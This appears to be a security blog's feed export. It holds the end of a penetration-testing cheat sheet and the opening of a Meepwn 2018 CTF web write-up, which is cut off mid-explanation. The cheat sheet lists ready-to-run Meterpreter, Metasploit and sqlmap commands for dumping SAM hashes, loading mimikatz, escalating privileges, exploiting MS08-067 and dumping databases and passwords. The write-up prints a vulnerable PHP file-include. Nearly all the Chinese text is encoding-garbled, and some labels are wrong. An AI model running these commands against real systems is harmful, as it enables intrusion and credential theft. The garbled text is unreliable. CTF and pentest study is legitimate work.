Windows VNC Payload</td></tr></tbody></table><h3 id="Linux-ÂèçÂêëMeterpreter-payload"><a href="#Linux-ÂèçÂêëMeterpreter-payload" class="headerlink" title="Linux ÂèçÂêëMeterpreter payload"></a>Linux ÂèçÂêëMeterpreter payload</h3><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>set payload linux/meterpreter/reverse_tcp</code></td><td>Meterpreter Linux ÂèçÂêëPayload</td></tr></tbody></table><h2 id="MeterpreterÈÄüÊü•Ë°®"><a href="#MeterpreterÈÄüÊü•Ë°®" class="headerlink" title="MeterpreterÈÄüÊü•Ë°®"></a>MeterpreterÈÄüÊü•Ë°®</h2><p>ÊúâÁî®ÁöÑmeterpreter ÂëΩ‰ª§„ÄÇ</p><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>upload file c:\\windows</code></td><td>Meterpreter‰∏ä‰º†Êñá‰ª∂Âà∞ Windows ÁõÆÊ†á</td></tr><tr><td><code>download c:\\windows\\repair\\sam /tmp</code></td><td>Meterpreter ‰ªé Windows ÁõÆÊ†á‰∏ãËΩΩÊñá‰ª∂</td></tr><tr><td><code>execute -f c:\\windows\temp\exploit.exe</code></td><td>Meterpreter Âú®ÁõÆÊ†áÊú∫Âô®‰∏äÊâßË°å.exeÊñá‰ª∂‚Äî‚ÄîÁî®Êù•ÊâßË°å‰∏ä‰º†ÁöÑexpÂæàÊñπ‰æø</td></tr><tr><td><code>execute -f cmd -c</code></td><td>ÂàõÂª∫Êñ∞ÁöÑcmd shellÈÄöÈÅì</td></tr><tr><td><code>ps</code></td><td>MeterpreterÊòæÁ§∫ËøõÁ®ã</td></tr><tr><td><code>shell</code></td><td>MeterpreterËé∑ÂèñÁõÆÊ†áshell</td></tr><tr><td><code>getsystem</code></td><td>MeterpreterÂ∞ùËØïÊèêÊùÉ</td></tr><tr><td><code>hashdump</code></td><td>MeterpreterÂ∞ùËØïÂØºÂá∫ÁõÆÊ†áÊú∫Âô®‰∏äÁöÑÂìàÂ∏å</td></tr><tr><td><code>portfwd add ‚Äìl 3389 ‚Äìp 3389 ‚Äìr target</code></td><td>MeterpreterÁ´ØÂè£ËΩ¨Âèë</td></tr><tr><td><code>portfwd delete ‚Äìl 3389 ‚Äìp 3389 ‚Äìr target</code></td><td>MeterpreterÂà†Èô§Á´ØÂè£ËΩ¨Âèë</td></tr></tbody></table><h2 id="Â∏∏Áî®Metasploit-Ê®°Âùó"><a href="#Â∏∏Áî®Metasploit-Ê®°Âùó" class="headerlink" title="Â∏∏Áî®Metasploit Ê®°Âùó"></a>Â∏∏Áî®Metasploit Ê®°Âùó</h2><p>ÊúÄÂ∏∏Áî®ÁöÑmetasploit Ê®°Âùó„ÄÇ</p><h3 id="ËøúÁ®ãWindows-Metasploit-Ê®°Âùó-exploits"><a href="#ËøúÁ®ãWindows-Metasploit-Ê®°Âùó-exploits" class="headerlink" title="ËøúÁ®ãWindows Metasploit Ê®°Âùó(exploits)"></a>ËøúÁ®ãWindows Metasploit Ê®°Âùó(exploits)</h3><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>use exploit/windows/smb/ms08_067_netapi</code></td><td>MS08_067 Windows 2k, XP, 2003 ËøúÁ®ãÊîªÂáª</td></tr><tr><td><code>use exploit/windows/dcerpc/ms06_040_netapi</code></td><td>MS08_040 Windows NT, 2k, XP, 2003 ËøúÁ®ãÊîªÂáª</td></tr><tr><td><code>use exploit/windows/smb/ms09_050_smb2_negotiate_func_index</code></td><td>MS09_050 Windows Vista SP1/SP2 ÂíåServer 2008 (x86) ËøúÁ®ãÊîªÂáª</td></tr></tbody></table><h3 id="Êú¨Âú∞Windows-Metasploit-Ê®°Âùó-exploits"><a href="#Êú¨Âú∞Windows-Metasploit-Ê®°Âùó-exploits" class="headerlink" title="Êú¨Âú∞Windows Metasploit Ê®°Âùó(exploits)"></a>Êú¨Âú∞Windows Metasploit Ê®°Âùó(exploits)</h3><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>use exploit/windows/local/bypassuac</code></td><td>ÁªïËøá Windows 7 ‰∏äÁöÑUAC</td></tr></tbody></table><h3 id="ËæÖÂä©Metasploit-Ê®°Âùó"><a href="#ËæÖÂä©Metasploit-Ê®°Âùó" class="headerlink" title="ËæÖÂä©Metasploit Ê®°Âùó"></a>ËæÖÂä©Metasploit Ê®°Âùó</h3><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>use auxiliary/scanner/http/dir_scanner</code></td><td>Metasploit HTTP ÁõÆÂΩïÊâ´Êèè</td></tr><tr><td><code>use auxiliary/scanner/http/jboss_vulnscan</code></td><td>Metasploit JBOSS ÊºèÊâ´</td></tr><tr><td><code>use auxiliary/scanner/mssql/mssql_login</code></td><td>Metasploit MSSQL ËÆ§ËØÅÊâ´Êèè</td></tr><tr><td><code>use auxiliary/scanner/mysql/mysql_version</code></td><td>Metasploit MSSQL ÁâàÊú¨Êâ´Êèè</td></tr><tr><td><code>use auxiliary/scanner/oracle/oracle_login</code></td><td>Metasploit Oracle ÁôªÈôÜÊ®°Âùó</td></tr></tbody></table><h3 id="Metasploit-Powershell-Ê®°Âùó"><a href="#Metasploit-Powershell-Ê®°Âùó" class="headerlink" title="Metasploit Powershell Ê®°Âùó"></a>Metasploit Powershell Ê®°Âùó</h3><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>use exploit/multi/script/web_delivery</code></td><td>Metasploit powershell payload c‰º†ÈÄÅÊ®°Âùó</td></tr><tr><td><code>post/windows/manage/powershell/exec_powershell</code></td><td>MetasploitÈÄöËøá‰ºöËØù‰∏ä‰º†ÂíåÊâßË°å powershellËÑöÊú¨</td></tr><tr><td><code>use exploit/multi/http/jboss_maindeployer</code></td><td>Metasploit JBOSS ÈÉ®ÁΩ≤</td></tr><tr><td><code>use exploit/windows/mssql/mssql_payload</code></td><td>Metasploit MSSQL payload</td></tr></tbody></table><h3 id="Windows-ÂêéÊ∏óÈÄèMetasploit-Ê®°Âùó"><a href="#Windows-ÂêéÊ∏óÈÄèMetasploit-Ê®°Âùó" class="headerlink" title="Windows ÂêéÊ∏óÈÄèMetasploit Ê®°Âùó"></a>Windows ÂêéÊ∏óÈÄèMetasploit Ê®°Âùó</h3><p>Windows Metasploit ÊèêÊùÉÊ®°Âùó„ÄÇ</p><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>run post/windows/gather/win_privs</code></td><td>Metasploit ÊòæÁ§∫ÂΩìÂâçÁî®Êà∑ÊùÉÈôê</td></tr><tr><td><code>use post/windows/gather/credentials/gpp</code></td><td>Metasploit ÊèêÂèñ GPP ‰øùÂ≠òÁöÑÂØÜÁ†Å</td></tr><tr><td><code>load mimikatz -&gt; wdigest</code></td><td>Metasplit Âä†ËΩΩ Mimikatz</td></tr><tr><td><code>run post/windows/gather/local_admin_search_enum</code></td><td>Ê£ÄÊü•ÂΩìÂâçÁî®Êà∑ÊòØÂê¶ÂØπÂüüÂÜÖÂÖ∂‰ªñÊú∫Âô®ÊúâÁÆ°ÁêÜÂëòÊùÉÈôê</td></tr><tr><td><code>run post/windows/gather/smart_hashdump</code></td><td>Ëá™Âä®ÂåñÂØºÂá∫sam Êñá‰ª∂ÔºåÂ∞ùËØïÊèêÊùÉÁ≠â„ÄÇ</td></tr></tbody></table><h2 id="ASCIIË°®ÈÄüÊü•"><a href="#ASCIIË°®ÈÄüÊü•" class="headerlink" title="ASCIIË°®ÈÄüÊü•"></a>ASCIIË°®ÈÄüÊü•</h2><p>ÂØπWebÂ∫îÁî®Ê∏óÈÄèÊµãËØïÂæàÊúâÁî®ÔºåÊàñËÄÖ‰Ω†Ë¢´Âõ∞Âú®ÁÅ´ÊòüËÄåÈúÄË¶ÅÂíåNASAÈÄö‰ø°„ÄÇÔºàÊ¢óËá™„ÄäÁÅ´ÊòüÊïëÊè¥„ÄãÔºâ</p><table><thead><tr><th>ASCII</th><th>Â≠óÁ¨¶</th></tr></thead><tbody><tr><td><code>x00</code></td><td>Null Byte Á©∫Â≠óËäÇ</td></tr><tr><td><code>x08</code></td><td>BS  ÈÄÄÊ†º</td></tr><tr><td><code>x09</code></td><td>TAB Ê∞¥Âπ≥Âà∂Ë°®Á¨¶</td></tr><tr><td><code>x0a</code></td><td>LF Êç¢Ë°å</td></tr><tr><td><code>x0d</code></td><td>CR ÂõûËΩ¶</td></tr><tr><td><code>x1b</code></td><td>ESC</td></tr><tr><td><code>x20</code></td><td>SPC Á©∫Ê†º</td></tr><tr><td><code>x21</code></td><td>!</td></tr><tr><td><code>x22</code></td><td>‚Äú</td></tr><tr><td><code>x23</code></td><td>#</td></tr><tr><td><code>x24</code></td><td>$</td></tr><tr><td><code>x25</code></td><td>%</td></tr><tr><td><code>x26</code></td><td>&amp;</td></tr><tr><td><code>x27</code></td><td>`</td></tr><tr><td><code>x28</code></td><td>(</td></tr><tr><td><code>x29</code></td><td>)</td></tr><tr><td><code>x2a</code></td><td>*</td></tr><tr><td><code>x2b</code></td><td>+</td></tr><tr><td><code>x2c</code></td><td>,</td></tr><tr><td><code>x2d</code></td><td>-</td></tr><tr><td><code>x2e</code></td><td>.</td></tr><tr><td><code>x2f</code></td><td>/</td></tr><tr><td><code>x30</code></td><td>0</td></tr><tr><td><code>x31</code></td><td>1</td></tr><tr><td><code>x32</code></td><td>2</td></tr><tr><td><code>x33</code></td><td>3</td></tr><tr><td><code>x34</code></td><td>4</td></tr><tr><td><code>x35</code></td><td>5</td></tr><tr><td><code>x36</code></td><td>6</td></tr><tr><td><code>x37</code></td><td>7</td></tr><tr><td><code>x38</code></td><td>8</td></tr><tr><td><code>x39</code></td><td>9</td></tr><tr><td><code>x3a</code></td><td>:</td></tr><tr><td><code>x3b</code></td><td>;</td></tr><tr><td><code>x3c</code></td><td>&lt;</td></tr><tr><td><code>x3d</code></td><td>=</td></tr><tr><td><code>x3e</code></td><td>&gt;</td></tr><tr><td><code>x3f</code></td><td>?</td></tr><tr><td><code>x40</code></td><td>@</td></tr><tr><td><code>x41</code></td><td>A</td></tr><tr><td><code>x42</code></td><td>B</td></tr><tr><td><code>x43</code></td><td>C</td></tr><tr><td><code>x44</code></td><td>D</td></tr><tr><td><code>x45</code></td><td>E</td></tr><tr><td><code>x46</code></td><td>F</td></tr><tr><td><code>x47</code></td><td>G</td></tr><tr><td><code>x48</code></td><td>H</td></tr><tr><td><code>x49</code></td><td>I</td></tr><tr><td><code>x4a</code></td><td>J</td></tr><tr><td><code>x4b</code></td><td>K</td></tr><tr><td><code>x4c</code></td><td>L</td></tr><tr><td><code>x4d</code></td><td>M</td></tr><tr><td><code>x4e</code></td><td>N</td></tr><tr><td><code>x4f</code></td><td>O</td></tr><tr><td><code>x50</code></td><td>P</td></tr><tr><td><code>x51</code></td><td>Q</td></tr><tr><td><code>x52</code></td><td>R</td></tr><tr><td><code>x53</code></td><td>S</td></tr><tr><td><code>x54</code></td><td>T</td></tr><tr><td><code>x55</code></td><td>U</td></tr><tr><td><code>x56</code></td><td>V</td></tr><tr><td><code>x57</code></td><td>W</td></tr><tr><td><code>x58</code></td><td>X</td></tr><tr><td><code>x59</code></td><td>Y</td></tr><tr><td><code>x5a</code></td><td>Z</td></tr><tr><td><code>x5b</code></td><td>[</td></tr><tr><td><code>x5c</code></td><td>\</td></tr><tr><td><code>x5d</code></td><td>]</td></tr><tr><td><code>x5e</code></td><td>^</td></tr><tr><td><code>x5f</code></td><td>_</td></tr><tr><td><code>x60</code></td><td>`</td></tr><tr><td><code>x61</code></td><td>a</td></tr><tr><td><code>x62</code></td><td>b</td></tr><tr><td><code>x63</code></td><td>c</td></tr><tr><td><code>x64</code></td><td>d</td></tr><tr><td><code>x65</code></td><td>e</td></tr><tr><td><code>x66</code></td><td>f</td></tr><tr><td><code>x67</code></td><td>g</td></tr><tr><td><code>x68</code></td><td>h</td></tr><tr><td><code>x69</code></td><td>i</td></tr><tr><td><code>x6a</code></td><td>j</td></tr><tr><td><code>x6b</code></td><td>k</td></tr><tr><td><code>x6c</code></td><td>l</td></tr><tr><td><code>x6d</code></td><td>m</td></tr><tr><td><code>x6e</code></td><td>n</td></tr><tr><td><code>x6f</code></td><td>o</td></tr><tr><td><code>x70</code></td><td>p</td></tr><tr><td><code>x71</code></td><td>q</td></tr><tr><td><code>x72</code></td><td>r</td></tr><tr><td><code>x73</code></td><td>s</td></tr><tr><td><code>x74</code></td><td>t</td></tr><tr><td><code>x75</code></td><td>u</td></tr><tr><td><code>x76</code></td><td>v</td></tr><tr><td><code>x77</code></td><td>w</td></tr><tr><td><code>x78</code></td><td>x</td></tr><tr><td><code>x79</code></td><td>y</td></tr><tr><td><code>x7a</code></td><td>z</td></tr></tbody></table><h2 id="CISCO-IOS-ÁΩëÈôÖÊìç‰ΩúÁ≥ªÁªü-ÂëΩ‰ª§"><a href="#CISCO-IOS-ÁΩëÈôÖÊìç‰ΩúÁ≥ªÁªü-ÂëΩ‰ª§" class="headerlink" title="CISCO IOS(ÁΩëÈôÖÊìç‰ΩúÁ≥ªÁªü) ÂëΩ‰ª§"></a>CISCO IOS(ÁΩëÈôÖÊìç‰ΩúÁ≥ªÁªü) ÂëΩ‰ª§</h2><p>Êî∂ÈõÜ‰∏Ä‰∫õÊúâÁî®ÁöÑCisco IOS ÂëΩ‰ª§.</p><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>enable</code></td><td>ËøõÂÖ•‰ΩøËÉΩÊ®°Âºè</td></tr><tr><td><code>conf t</code></td><td>ÈÖçÁΩÆÁªàÁ´Ø</td></tr><tr><td><code>(config)# interface fa0/0</code></td><td>ÈÖçÁΩÆ FastEthernet 0/0</td></tr><tr><td><code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code></td><td>Ê∑ªÂä†IPÂà∞ fa0/0</td></tr><tr><td><code>(config-if)# line vty 0 4</code></td><td>ÈÖçÁΩÆ vty line</td></tr><tr><td><code>(config-line)# login</code></td><td>ÁôªÈôÜ</td></tr><tr><td><code>(config-line)# password YOUR-PASSWORD</code></td><td>ËÆæÁΩÆ telnet ÂØÜÁ†Å</td></tr><tr><td><code># show running-config</code></td><td>ÊòæÁ§∫ÂÜÖÂ≠ò‰∏≠ÁöÑËøêË°åÈÖçÁΩÆ</td></tr><tr><td><code># show startup-config</code></td><td>ÊòæÁ§∫ÂêØÂä®ÈÖçÁΩÆ</td></tr><tr><td><code># show version</code></td><td>ÊòæÁ§∫cisco IOS ÁâàÊú¨</td></tr><tr><td><code># show session</code></td><td>ÊòæÁ§∫Â∑≤ÊâìÂºÄÁöÑ‰ºöËØù</td></tr><tr><td><code># show ip interface</code></td><td>ÊòæÁ§∫ÁΩëÂç°</td></tr><tr><td><code># show interface e0</code></td><td>ÊòæÁ§∫ÁΩëÁªúÊé•Âè£ÁªÜËäÇ</td></tr><tr><td><code># show ip route</code></td><td>ÊòæÁ§∫Ë∑ØÁî±</td></tr><tr><td><code># show access-lists</code></td><td>ÊòæÁ§∫access lists</td></tr><tr><td><code># dir file systems</code></td><td>ÂàóÂá∫ÂèØÁî®Êñá‰ª∂</td></tr><tr><td><code># dir all-filesystems</code></td><td>ÊòæÁ§∫Êñá‰ª∂‰ø°ÊÅØ</td></tr><tr><td><code># dir /all</code></td><td>ÊòæÁ§∫Â∑≤Âà†Èô§Êñá‰ª∂</td></tr><tr><td><code># terminal length 0</code></td><td>ÂèñÊ∂àÁªàÁ´ØËæìÂá∫ÈïøÂ∫¶ÈôêÂà∂</td></tr><tr><td><code># copy running-config tftp</code></td><td>Â§çÂà∂ËøêË°åÈÖçÁΩÆÂà∞tftp ÊúçÂä°Âô®</td></tr><tr><td><code># copy running-config startup-config</code></td><td>Â§çÂà∂ÂêØÂä®ÈÖçÁΩÆÂà∞ËøêË°åÈÖçÁΩÆ</td></tr></tbody></table><h2 id="ÂØÜÁ†ÅÂ≠¶"><a href="#ÂØÜÁ†ÅÂ≠¶" class="headerlink" title="ÂØÜÁ†ÅÂ≠¶"></a>ÂØÜÁ†ÅÂ≠¶</h2><h3 id="ÂìàÂ∏åÈïøÂ∫¶"><a href="#ÂìàÂ∏åÈïøÂ∫¶" class="headerlink" title="ÂìàÂ∏åÈïøÂ∫¶"></a>ÂìàÂ∏åÈïøÂ∫¶</h3><table><thead><tr><th>ÂìàÂ∏å</th><th>ÈïøÂ∫¶</th></tr></thead><tbody><tr><td>MD5</td><td><code>16 Bytes</code></td></tr><tr><td>SHA-1</td><td><code>20 Bytes</code></td></tr><tr><td>SHA-256</td><td><code>32 Bytes</code></td></tr><tr><td>SHA-512</td><td><code>64 Bytes</code></td></tr></tbody></table><h3 id="ÂìàÂ∏å‰æãÂ≠ê"><a href="#ÂìàÂ∏å‰æãÂ≠ê" class="headerlink" title="ÂìàÂ∏å‰æãÂ≠ê"></a>ÂìàÂ∏å‰æãÂ≠ê</h3><p>ÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®  <strong>hash-identifier</strong>  ÂëΩ‰ª§Âà§Êñ≠ÂìàÂ∏åÁ±ªÂûãÔºå‰ΩÜËøôÈáåËøòÊòØ‰∏æ‰∫õ‰æãÂ≠ê„ÄÇ</p><table><thead><tr><th>ÂìàÂ∏å</th><th>‰æãÂ≠ê</th></tr></thead><tbody><tr><td>MD5 Hash Example</td><td><code>8743b52063cd84097a65d1633f5c74f5</code></td></tr><tr><td>MD5 $PASS:$SALT Example</td><td><code>01dfae6e5d4d90d9892622325959afbe:7050461</code></td></tr><tr><td>MD5 $SALT:$PASS</td><td><code>f0fda58630310a6dd91a7d8f0a4ceda2:4225637426</code></td></tr><tr><td>SHA1 Hash Example</td><td><code>b89eaac7e61417341b710b727768294d0e6a277b</code></td></tr><tr><td>SHA1 $PASS:$SALT</td><td><code>2fc5a684737ce1bf7b3b239df432416e0dd07357:2014</code></td></tr><tr><td>SHA1 $SALT:$PASS</td><td><code>cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024</code></td></tr><tr><td>SHA-256</td><td><code>127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935</code></td></tr><tr><td>SHA-256 $PASS:$SALT</td><td><code>c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4</code></td></tr><tr><td>SHA-256 $SALT:$PASS</td><td><code>eb368a2dfd38b405f014118c7d9747fcc97f4f0ee75c05963cd9da6ee65ef498:560407001617</code></td></tr><tr><td>SHA-512</td><td><code>82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f</code></td></tr><tr><td>SHA-512 $PASS:$SALT</td><td><code>e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd</code></td></tr><tr><td>SHA-512 $SALT:$PASS</td><td><code>976b451818634a1e2acba682da3fd6efa72adf8a7a08d7939550c244b237c72c7d42367544e826c0c83fe5c02f97c0373b6b1386cc794bf0d21d2df01bb9c08a</code></td></tr><tr><td>NTLM Hash Example</td><td><code>b4b9b02e6f09a9bd760f388b67351e2b</code></td></tr></tbody></table><h2 id="SQLMap‰æãÂ≠ê"><a href="#SQLMap‰æãÂ≠ê" class="headerlink" title="SQLMap‰æãÂ≠ê"></a>SQLMap‰æãÂ≠ê</h2><p>Â∞èÂûã SQLMap ÈÄüÊü•Ë°®Ôºö</p><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>sqlmap -u http://meh.com --forms --batch --crawl=10  --cookie=jsessionid=54321 --level=5 --risk=3</code></td><td>Ëá™Âä®ÂåñsqlmapÊâ´Êèè</td></tr><tr><td><code>sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE  --level=3 --current-user --current-db --passwords  --file-read=&quot;/var/www/blah.php&quot;</code></td><td>ÊåáÂÆöÁõÆÊ†áÁöÑsqlmap scan</td></tr><tr><td><code>sqlmap -u &quot;http://meh.com/meh.php?id=1&quot; --dbms=mysql --tech=U --random-agent --dump</code></td><td>‰ΩøÁî®ËÅîÂêàÊü•ËØ¢ÊäÄÊúØÊâ´ÊèèmysqlÂêéÁ´ØÁöÑÂü∫‰∫éÊä•ÈîôÁöÑÊ≥®ÂÖ• Ôºå‰ΩøÁî®ÈöèÊú∫UAÔºåÂØºÂá∫Êï∞ÊçÆÂ∫ì</td></tr><tr><td><code>sqlmap -o -u &quot;http://meh.com/form/&quot; --forms</code></td><td>Ê£ÄÊµãÂèØËÉΩÂ≠òÂú®Ê≥®ÂÖ•ÁÇπË°®Âçï</td></tr><tr><td><code>sqlmap -o -u &quot;http://meh/vuln-form&quot; --forms  -D database-name -T users --dump</code></td><td>ÂØºÂá∫ÊåáÂÆöÊï∞ÊçÆÂ∫ìÁöÑuserË°®Âπ∂Â∞ùËØïÁ†¥Ëß£ÂìàÂ∏å„ÄÇ</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ê∏óÈÄèÊµãËØïÂ∑•ÂÖ∑Â§áÂøòÂΩï&quot;&gt;&lt;a href=&quot;#Ê∏óÈÄèÊµãËØïÂ∑•ÂÖ∑Â§áÂøòÂΩï&quot; class=&quot;headerlink&quot; title=&quot;Ê∏óÈÄèÊµãËØïÂ∑•ÂÖ∑Â§áÂøòÂΩï&quot;&gt;&lt;/a&gt;Ê∏óÈÄèÊµãËØïÂ∑•ÂÖ∑Â§áÂøòÂΩï&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Êú¨ÊñáÁøªËØëËá™ &lt;a href=&quot;https://highon.coff
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Meepwn2018ÔºöMaplStory‚Äî‚Äî‰ª•Cookie‰∏∫Ë∑≥ÊùøÁöÑSessionÊñá‰ª∂ÂåÖÂê´</title>
    <link href="https://findneo.github.io/180721MeepwnMaplStory/"/>
    <id>https://findneo.github.io/180721MeepwnMaplStory/</id>
    <published>2018-07-20T19:43:44.000Z</published>
    <updated>2019-01-25T23:21:37.032Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Êú¨ÊñáÈ¶ñÂèë <a href="https://xz.aliyun.com/t/2463" target="_blank" rel="noopener">ÂÖàÁü•Á§æÂå∫</a> ÔºåËΩ¨ËΩΩËØ∑Ê≥®ÊòéÈìæÊé•„ÄÇ</strong> </p><p>Êú¨È¢òËÄÉÂØüPHPÊ∫êÁ†ÅÂÆ°ËÆ°„ÄÇ‰∏ªË¶ÅÊúâ‰∏§‰∏™Áº∫Èô∑Ôºö‰ΩøÁî®ECBÊ®°ÂºèËøõË°åAESÂä†ÂØÜÂØºËá¥ÁöÑCPAÔºàÈÄâÊã©ÊòéÊñáÊîªÂáªÔºâÂíå Êñá‰ª∂ÂåÖÂê´„ÄÇÊúâ‰∏§Â§ÑÂèØ‰ª•ÂêëÊñá‰ª∂ÂÜôÂÖ•ÂÜÖÂÆπ‰ª•‰æõÂåÖÂê´Ôºå‰ΩÜÂùáË¢´ËøáÊª§ÔºåÊúÄÁªàÈÄöËøá‰ª•Êú™Ë¢´ËøáÊª§ÁöÑCookie‰∏∫Ë∑≥ÊùøËøûÊé•‰∏§Â§ÑÊñá‰ª∂ÂåÖÂê´Êù•ÂÜôÂÖ•Shell„ÄÇÊñáÊú´Ëøò‰ªãÁªç‰∫Ü‰∏ÄÁßçÊ∑±ÂÖ•Âà©Áî®‰∏ÄÂ§ÑÊñá‰ª∂ÂåÖÂê´getshellÁöÑËß£Ê≥ï„ÄÇ</p><h1 id="Ê¶ÇËßà"><a href="#Ê¶ÇËßà" class="headerlink" title="Ê¶ÇËßà"></a>Ê¶ÇËßà</h1><p>ÊâìÂºÄ <a href="http://178.128.87.16" target="_blank" rel="noopener">http://178.128.87.16</a> ÊòØ‰∏Ä‰∏™ÁôªÈôÜÈ°µÈù¢ÔºåÊ≥®ÂÜåË¥¶Êà∑ÂêéÊúâÂõõ‰∏™È°µÈù¢Ôºå<code>HOME</code> ÊòØÊ¨¢ËøéÈ°µÔºå<code>CHARACTER</code> È°µÂèØ‰ª•ÂíåÂÆ†Áâ©ËßíËâ≤‰∫íÂä®Ôºå‰ΩÜË¥¶Êà∑ÂàöÊ≥®ÂÜåÂÆåÊòØÊ≤°ÊúâÂÆ†Áâ©ÁöÑÔºåÈúÄË¶ÅËé∑ÂèñADMINÊùÉÈôêÂêéËá™Ë°åÊ∑ªÂä†Ôºå <code>SETTING</code> È°µÂèØ‰ª•‰øÆÊîπÁî®Êà∑ÂêçÂíåÈÄâÊã©Â§¥ÂÉèÔºå<code>GAME</code> È°µÊòØ‰∏Ä‰∏™FlashÂ∞èÊ∏∏ÊàèÔºåÂíåÊú¨È¢òÊó†ÂÖ≥„ÄÇ</p><p>È¢òÁõÆÊèê‰æõ‰∫ÜÊ∫êÁ†Å‰∏ãËΩΩÔºåÂèØ‰ª•‰ªé <a href="https://ctf.meepwn.team/attachments/web/MaplStory_f7056ad79428f636ca4e92f283727818ecc0dd70ecb95f8a12e2764df0946022.zip" target="_blank" rel="noopener">ËøôÈáå</a> Êàñ <a href="https://github.com/findneo/ctfgodown/blob/master/20180718-Meepwn%20CTF%20Quals%202018/WEB/MaplStory_f7056ad79428f636ca4e92f283727818ecc0dd70ecb95f8a12e2764df0946022.zip" target="_blank" rel="noopener">Â§áÁî®Âú∞ÂùÄ</a> ‰∏ãËΩΩ„ÄÇ</p><p><img src="1532072388162.png" alt="1532072388162"></p><h1 id="Êñá‰ª∂ÂåÖÂê´"><a href="#Êñá‰ª∂ÂåÖÂê´" class="headerlink" title="Êñá‰ª∂ÂåÖÂê´"></a>Êñá‰ª∂ÂåÖÂê´</h1><h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><p><code>index.php</code> Êñá‰ª∂‰∏≠ÊúâÂ¶Ç‰∏ãËØ≠Âè•ÔºåÊòæÁÑ∂Â≠òÂú®Êñá‰ª∂ÂåÖÂê´„ÄÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'page'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'page'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‰ΩÜÊâÄÊúâ <code>GET</code> Âíå<code>POST</code> Êèê‰∫§ÁöÑÂèÇÊï∞ÈÉΩ‰ºöË¢´Âà†Èô§ÊéâÊïèÊÑüÂ≠óÁ¨¶‰∏≤ÔºåÂÖ∂‰∏≠ <code>//</code> „ÄÅ<code>(.+)</code> Âíå<code>`</code> `  ÊòØÊØîËæÉÂÄºÂæóÊ≥®ÊÑèÁöÑ„ÄÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bad_words</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them.</span></span><br><span class="line"><span class="comment">//Maybe some word is false positive but pls accept it, for a no-cancer gaming environment!</span></span><br><span class="line">$too_bad=<span class="string">"/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is"</span>;</span><br><span class="line">$value = preg_replace($too_bad, str_repeat(<span class="string">"*"</span>,<span class="number">3</span>) ,$value);</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($value))&#123;mapl_die();&#125;</span><br><span class="line">$value=bad_words($value);</span><br><span class="line">$_GET[$key]=$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key2=&gt;$value2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (is_array($value2))&#123;mapl_die();&#125;</span><br><span class="line">$value2=bad_words($value2);</span><br><span class="line">$_POST[$key2]=$value2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PHP‰ΩøÁî®PHPSESSID cookieÂÄº Â≠òÂÇ®‰ºöËØùÊ†áËØÜÔºå‰∏ÄËà¨Âú®<code>/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;</code> 